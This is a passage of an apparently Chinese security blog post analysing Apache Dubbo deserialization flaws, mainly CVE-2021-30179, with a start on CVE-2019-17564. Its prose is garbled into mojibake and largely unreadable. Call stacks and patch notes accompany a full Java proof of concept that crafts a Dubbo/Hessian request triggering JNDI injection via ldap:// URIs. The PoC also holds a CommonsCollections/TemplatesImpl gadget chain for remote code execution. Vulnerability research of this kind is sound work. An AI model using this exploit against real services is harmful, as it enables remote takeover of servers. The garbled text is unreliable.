title="2.7.9"></a>2.7.9</h4><p>é’ˆå¯¹ä¸Šä¸€ä¸ªç‰ˆæœ¬hessianåˆ©ç”¨æ–¹å¼ï¼Œå¯¹äº‹ä»¶è¿›è¡Œäº†é•¿åº¦é™åˆ¶ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903171400694.png" alt="image-20240903171400694"></p><p>åˆ¤æ–­äº†å¾…ååºåˆ—åŒ–çš„æ•°æ®é•¿åº¦æ˜¯å¦è¶…è¿‡é…ç½®çš„é˜ˆå€¼ï¼ˆé»˜è®¤ä¸º50ï¼‰ï¼Œå¦‚è¶…è¿‡åˆ™æŠ›å‡ºå¼‚å¸¸ï¼Œä¸å†ç»§ç»­ååºåˆ—åŒ–ï¼Œè¿™æ ·å°±å¯¼è‡´äº†ä¸Šé¢çš„way 2ä¸èƒ½å¤Ÿä½¿ç”¨äº†</p><p>ä½†æ˜¯ä¸Šé¢çš„ç¬¬ä¸€ç§æ–¹æ³•ä»ç„¶å¯ä»¥ä½¿ç”¨ã€‚</p><p><img src="/2024/09/02/Dubbo/image-20240903171423720.png" alt="image-20240903171423720"></p><h4 id="CVE-2021-30179"><a href="#CVE-2021-30179" class="headerlink" title="CVE-2021-30179"></a>CVE-2021-30179</h4><p>å½±å“ï¼š</p><p>Apache Dubbo <strong>2.7.0</strong> to <strong>2.7.9</strong></p><p>Apache Dubbo <strong>2.6.0</strong> to <strong>2.6.9</strong></p><p>å°è·Ÿä¸€ä¸‹ã€‚</p><p>æ ¹æ®å‰é¢çš„åˆ†ææˆ‘ä»¬çŸ¥é“ï¼Œä¼šè°ƒç”¨<code>DecodeHandler#decode</code>æ–¹æ³•è¿›è¡Œå¤„ç†</p><p>ä¹‹ååœ¨<code>DecodeHandler#decode</code>æ–¹æ³•ä¸­å­˜åœ¨è¿‡æ»¤æ“ä½œï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908000841134.png" alt="image-20240908000841134"></p><p>æ„ä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">åˆ¤æ–­æ–¹æ³•åæ˜¯å¦ä¸ºinvokeæˆ–è€…invokeAsyncï¼Œdescæ˜¯å¦ä¸ºLjava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;ï¼Œå¦‚æœä¸æ»¡è¶³åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸<br><br>decodeå®Œæˆä¹‹åå°†è°ƒç”¨HeaderExchangeHandler.java#receivedæ–¹æ³•å¤„ç†è¯·æ±‚ï¼Œè‹¥ä¸ºæ³›å‹å¼•ç”¨ï¼Œåˆ™å°†è°ƒç”¨GenericFilter#invokeæ–¹æ³•<br></code></pre></td></tr></table></figure><p>åœ¨è·å–äº†æ–¹æ³•å&#x2F;ç±»å‹&#x2F;å‚æ•°ä¹‹åï¼Œå°†ä¼šé€šè¿‡åå°„è·å–è¯¥æ–¹æ³•ï¼Œå¦‚æœä¸å­˜åœ¨å°±ä¼šæŠ›å‡ºå¼‚å¸¸</p><p>æ¥ä¸‹æ¥å°†é€šè¿‡è·å–è¯·æ±‚ä¸­çš„genericå‚æ•°æ¥é€‰æ‹©é€šè¿‡raw.return&#x2F;nativejava&#x2F;beanååºåˆ—åŒ–å‚æ•°æˆpojoå¯¹è±¡ã€‚</p><p><img src="/2024/09/02/Dubbo/image-20240908000942693.png" alt="image-20240908000942693"></p><p>1ã€å¦‚æœgenericä¸ºraw.returnæˆ–è€…trueï¼Œå°†è°ƒç”¨PojoUtils#realizeæ–¹æ³•</p><p><img src="/2024/09/02/Dubbo/image-20240908001012036.png" alt="image-20240908001012036"></p><p><img src="/2024/09/02/Dubbo/image-20240908001018546.png" alt="image-20240908001018546"></p><p>æ¥ç€è°ƒç”¨äº†<code>readlize</code> <code>realize0</code></p><p>åœ¨readlize0ä¸­çš„é€»è¾‘ä¸º</p><blockquote><p>è‹¥pojoä¸ºMapå®ä¾‹ï¼Œåˆ™ä»pojoï¼ˆä¹Ÿå°±æ˜¯ä¸€å¼€å§‹çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼‰è·å–keyä¸ºâ€œclassâ€çš„å€¼ï¼Œå¹¶é€šè¿‡åå°„å¾—åˆ°classæ‰€å¯¹åº”çš„ç±»typeï¼Œå†åˆ¤æ–­å¯¹è±¡çš„ç±»å‹è¿›è¡Œä¸‹ä¸€æ­¥å¤„ç†</p><p>å¦‚æœtypeä¸æ˜¯Mapçš„å­ç±»ã€ä¸ä¸ºObject.classä¸”ä¸æ˜¯æ¥å£ï¼Œåˆ™è¿›å…¥elseï¼Œåœ¨elseä¸­ï¼Œå¯¹typeé€šè¿‡åå°„è¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œå¾—åˆ°å¯¹è±¡dest</p><p>å†å¯¹pojoè¿›è¡Œéå†ï¼Œä»¥é”®åä¸ºnameï¼Œå€¼ä¸ºvalueï¼Œè°ƒç”¨getSetterMethod(dest.getClass(), name, value.getClass());è·å–setæ–¹æ³•</p></blockquote><p><img src="/2024/09/02/Dubbo/image-20240908001114136.png" alt="image-20240908001114136"></p><p>ï¼Œä¹‹åå°±å¯ä»¥é€šè¿‡<code>org.apache.xbean.propertyeditor.JndiConverter</code>ç±»ä¸­çš„<code>setAsText</code>æ–¹æ³•è¿›è¡ŒJNDIæ³¨å…¥ã€‚</p><p>çœ‹ä¸€æ‰‹è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">setAsText:<span class="hljs-number">59</span>, AbstractConverter (org.apache.xbean.propertyeditor)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>realize0:<span class="hljs-number">483</span>, PojoUtils (org.apache.dubbo.common.utils)<br>realize:<span class="hljs-number">211</span>, PojoUtils (org.apache.dubbo.common.utils)<br>realize:<span class="hljs-number">99</span>, PojoUtils (org.apache.dubbo.common.utils)<br>invoke:<span class="hljs-number">91</span>, GenericFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">38</span>, ClassLoaderFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">41</span>, EchoFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>reply:<span class="hljs-number">145</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">152</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">177</span>, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)<br></code></pre></td></tr></table></figure><p>2ã€å¦‚æœgenericä¸ºbean, åˆ™å°†ä¼šè°ƒç”¨<code>JavaBeanSerializeUtil#deserialize</code>å¤„ç†</p><p><img src="/2024/09/02/Dubbo/image-20240908001222281.png" alt="image-20240908001222281"></p><p>å…¶ä¸­è°ƒç”¨äº†<code>instantiateForDeserialize</code>æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªJavaBeanDescriptoræè¿°çš„å¯¹è±¡</p><p>ä¹‹åè°ƒç”¨<code>deserializeInternal</code>è¿›è¡Œååºåˆ—åŒ–ï¼Œ å¦‚æœbeanDescriptor.isBeanType()ï¼ˆåªéœ€è¦å®ä¾‹åŒ–JavaBeanDescriptoræ—¶æŒ‡å®šå³å¯ï¼‰ï¼Œåˆ™å°†éå†beanDescriptorï¼Œè·å–propertyåŠvalueï¼Œè°ƒç”¨getSetterMethodè·å–å¯¹åº”çš„setæ–¹æ³•</p><p>æœ€ååˆ©ç”¨åå°„æ‰§è¡Œmethod.invoke(dest, value);ï¼Œå°±å¯ä»¥ä½¿ç”¨org.apache.xbean.propertyeditor.JndiConverterçš„setAsTextæ‰“JNDIæ³¨å…¥ã€‚</p><p><img src="/2024/09/02/Dubbo/image-20240908001303999.png" alt="image-20240908001303999"></p><p>è°ƒç”¨æ ˆä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">setAsText:<span class="hljs-number">59</span>, AbstractConverter (org.apache.xbean.propertyeditor)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>deserializeInternal:<span class="hljs-number">282</span>, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)<br>deserialize:<span class="hljs-number">215</span>, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)<br>deserialize:<span class="hljs-number">204</span>, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)<br>invoke:<span class="hljs-number">115</span>, GenericFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">38</span>, ClassLoaderFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">41</span>, EchoFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>reply:<span class="hljs-number">145</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">152</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">177</span>, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)<br></code></pre></td></tr></table></figure><p>3ã€å¦‚æœgenericæ˜¯nativejava, å°†éå†argsï¼Œå¦‚æœargs[i]çš„ç±»å‹ä¸ºbyteï¼Œä»¥args[]ä¸ºå‚å®ä¾‹åŒ–ä¸€ä¸ªUnsafeByteArrayInputStreamï¼Œå†é€šè¿‡åå°„è·å¾—NativeJavaSerializationï¼Œå†è°ƒç”¨NativeJavaSerialization#readObjectæ–¹æ³•</p><p><img src="/2024/09/02/Dubbo/image-20240908001352732.png" alt="image-20240908001352732"></p><p>ç›¸å½“äºæ‰§è¡Œäº†<code>UnsafeByteArrayInputStream#readObject</code>æ–¹æ³•é€ æˆäº†ååºåˆ—åŒ–</p><p>è°ƒç”¨æ ˆä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">readObject:<span class="hljs-number">371</span>, ObjectInputStream (java.io)<br>readObject:<span class="hljs-number">50</span>, NativeJavaObjectInput (org.apache.dubbo.common.serialize.nativejava)<br>invoke:<span class="hljs-number">98</span>, GenericFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">38</span>, ClassLoaderFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">41</span>, EchoFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>reply:<span class="hljs-number">145</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">152</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">177</span>, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)<br></code></pre></td></tr></table></figure><h5 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-comment">// header.</span><br>        <span class="hljs-type">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-comment">// set magic number.</span><br>        Bytes.short2bytes((<span class="hljs-type">short</span>) <span class="hljs-number">0xdabb</span>, header);<br>        <span class="hljs-comment">// set request and serialization flag.</span><br>        header[<span class="hljs-number">2</span>] = (<span class="hljs-type">byte</span>) ((<span class="hljs-type">byte</span>) <span class="hljs-number">0x80</span> | <span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">// set request id.</span><br>        Bytes.long2bytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">100000000</span>), header, <span class="hljs-number">4</span>);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">hessian2ByteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2ObjectOutput</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2ObjectOutput</span>(hessian2ByteArrayOutputStream);<br><br>        <span class="hljs-comment">// set body</span><br>        out.writeUTF(<span class="hljs-string">&quot;2.7.9&quot;</span>);<br>        <span class="hljs-comment">// todo æ­¤å¤„å¡«å†™Dubboæä¾›çš„æœåŠ¡å</span><br>        out.writeUTF(<span class="hljs-string">&quot;org.apache.dubbo.spring.boot.demo.consumer.DemoService&quot;</span>);<br>        out.writeUTF(<span class="hljs-string">&quot;&quot;</span>);<br>        out.writeUTF(<span class="hljs-string">&quot;$invoke&quot;</span>);<br>        out.writeUTF(<span class="hljs-string">&quot;Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;&quot;</span>);<br>        <span class="hljs-comment">// todo æ­¤å¤„å¡«å†™Dubboæä¾›çš„æœåŠ¡çš„æ–¹æ³•</span><br>        out.writeUTF(<span class="hljs-string">&quot;sayHello&quot;</span>);<br>        out.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;java.lang.String&quot;</span>&#125;);<br><br>        <span class="hljs-comment">// POC 1: raw.return</span><br><span class="hljs-comment">//        getRawReturnPayload(out, &quot;ldap://127.0.0.1:8087/Exploit&quot;);</span><br><br>        <span class="hljs-comment">// POC 2: bean</span><br>        getBeanPayload(out, <span class="hljs-string">&quot;ldap://127.0.0.1:1389/xitdbc&quot;</span>);<br><br>        <span class="hljs-comment">// POC 3: nativejava</span><br><span class="hljs-comment">//        getNativeJavaPayload(out, &quot;src\\main\\java\\top\\lz2y\\1.ser&quot;);</span><br><br>        out.flushBuffer();<br><br>        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, <span class="hljs-number">12</span>);<br>        byteArrayOutputStream.write(header);<br>        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());<br><br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br><br>        <span class="hljs-comment">//todo æ­¤å¤„å¡«å†™DubboæœåŠ¡åœ°å€åŠç«¯å£</span><br>        <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>);<br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> socket.getOutputStream();<br>        outputStream.write(bytes);<br>        outputStream.flush();<br>        outputStream.close();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getRawReturnPayload</span><span class="hljs-params">(Hessian2ObjectOutput out, String ldapUri)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">jndi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        jndi.put(<span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>);<br>        jndi.put(<span class="hljs-string">&quot;asText&quot;</span>, ldapUri);<br>        out.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;jndi&#125;);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;generic&quot;</span>, <span class="hljs-string">&quot;raw.return&quot;</span>);<br>        out.writeObject(map);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getBeanPayload</span><span class="hljs-params">(Hessian2ObjectOutput out, String ldapUri)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">JavaBeanDescriptor</span> <span class="hljs-variable">javaBeanDescriptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaBeanDescriptor</span>(<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="hljs-number">7</span>);<br>        javaBeanDescriptor.setProperty(<span class="hljs-string">&quot;asText&quot;</span>,ldapUri);<br>        out.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;javaBeanDescriptor&#125;);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        map.put(<span class="hljs-string">&quot;generic&quot;</span>, <span class="hljs-string">&quot;bean&quot;</span>);<br>        out.writeObject(map);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getNativeJavaPayload</span><span class="hljs-params">(Hessian2ObjectOutput out, String serPath)</span> <span class="hljs-keyword">throws</span> Exception, NotFoundException &#123;<br>        <span class="hljs-comment">//åˆ›å»ºTemplatesImplå¯¹è±¡åŠ è½½å­—èŠ‚ç </span><br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(<span class="hljs-string">&quot;ysoserial.vulndemo.Calc&quot;</span>).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;RoboTerh&quot;</span>);<br>        setFieldValue(obj,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(obj,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(obj,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br><br>        <span class="hljs-comment">//åˆ›å»º ChainedTransformerå®ä¾‹</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//åˆ›å»ºTranformingComparator å®ä¾‹</span><br>        <span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chain);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(priorityQueue, comparator);<br><br>        <span class="hljs-comment">//åºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baor);<br>        oos.writeObject(priorityQueue);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] payload = baor.toByteArray();<br><br>        out.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;payload&#125;);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;generic&quot;</span>, <span class="hljs-string">&quot;nativejava&quot;</span>);<br>        out.writeObject(map);<br>    &#125;<br></code></pre></td></tr></table></figure><h5 id="patch-1"><a href="#patch-1" class="headerlink" title="patch"></a>patch</h5><p>åœ¨2.7.10ç‰ˆæœ¬ä½¿ç”¨äº†é»‘åå•æ¥é˜»æ–­raw.returnå’Œbeanè¿™ä¸¤æ¡é“¾</p><p>åˆ†åˆ«åœ¨<code>org\apache\dubbo\common\utils\PojoUtils.java#realize0</code> <code>org\apache\dubbo\common\beanutil\JavaBeanSerializeUtil.java#name2Class</code></p><p>è€Œnativejavaåˆ™é€šè¿‡åˆ¤æ–­é…ç½®æ–‡ä»¶æ˜¯å¦å…è®¸nativejavaçš„ååºåˆ—åŒ–ã€‚</p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>é™¤äº†hessianï¼Œè¿˜æœ‰ä¸ªç¨å¾®æœ‰ç‚¹è¿œçš„httpæ¼æ´<code>CVE-2019-17564</code>ã€‚</p><h4 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h4><ul><li>2.7.0 &lt;&#x3D; Apache Dubbo &lt;&#x3D; 2.7.4</li><li>2.6.0 &lt;&#x3D; Apache Dubbo &lt;&#x3D; 2.6.7</li><li>Apache Dubbo &#x3D; 2.5.x</li></ul><p>è¿™ä¸ªCVEä¸»è¦æ˜¯å› ä¸ºåœ¨å‘é€POSTè¯·æ±‚çš„æ—¶å€™å°†ä¼šå°†bodyä¸­çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–å¤„ç†é€ æˆäº†æ¼æ´</p><p>æˆ‘ä»¬å¯ä»¥åœ¨å¼€å¯æœåŠ¡æä¾›è€…äº†ä¹‹åï¼Œåœ¨<code>org.apache.dubbo.remoting.http.servlet.DispatcherServlet#service</code>å¤„æ‰“ä¸‹æ–­ç‚¹ï¼Œè¿™ä¸ªç±»ä¸»è¦æ˜¯å¤„ç†è¯·æ±‚çš„åˆ†å‘çš„ç±»ï¼Œåœ¨æ¥æ”¶åˆ°httpè¯·æ±‚ä¹‹åä¼šè°ƒç”¨serviceæ–¹æ³•</p><p>ä¹‹åéšä¾¿å‘é€ä¸€ä¸ªpostè¯·æ±‚ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST -d <span class="hljs-string">&#x27;aa&#x27;</span> <span class="hljs-string">&#x27;http://192.168.56.1:8080/org.apache.dubbo.samples.http.api.DemoService&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/09/02/Dubbo/image-20240908001650492.png" alt="image-20240908001650492"></p><p>æˆåŠŸæ‹¦æˆªäº†è¿™ä¸ªhandler,ä¹‹åä¼šè°ƒç”¨handleæ–¹æ³•ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001703249.png" 